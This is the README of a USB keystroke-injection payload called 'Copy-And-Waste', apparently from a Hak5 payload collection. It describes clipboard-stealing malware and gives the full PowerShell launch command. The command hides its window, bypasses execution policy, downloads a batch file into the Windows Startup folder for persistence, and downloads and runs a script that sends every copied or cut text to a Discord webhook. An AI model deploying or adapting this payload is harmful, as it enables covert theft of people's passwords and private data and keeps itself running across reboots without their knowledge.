
# Copy-And-Waste

A payload to exfiltrate clipboard contents

## Description

This payload uses iwr to download 2 files 
I.bat
c.ps1

I.bat is downloaded to the startup folder to maintain persistance and execute c.ps1 on reboot/startup

c.ps1 will sit in AppData\Roaming folder, waiting for a Ctrl + C or Ctrl + X click 

Then the contents will then be sent to the discord webhook for viewing pleasure

For killing the script press both Ctrl buttons at the same time [It will resume at reboot]


## Getting Started

### Dependencies

* Pastebin or other file sharing service, Discord webhook or other webhook service
* Windows 10,11
* https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks is a tutorial on how to use Discord webhooks 


### Executing program

* Plug in your device
* Device will download both files and place them in proper directories to then run the script

powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""


## Contributing

All contributors names will be listed here:

[atomiczsec] https://github.com/atomiczsec
[I-Am-Jakoby] https://github.com/I-Am-Jakoby

## Version History

  0.1
  Initial Release

  ## Acknowledgments

* [Hak5]
* [I-Am-Jakoby]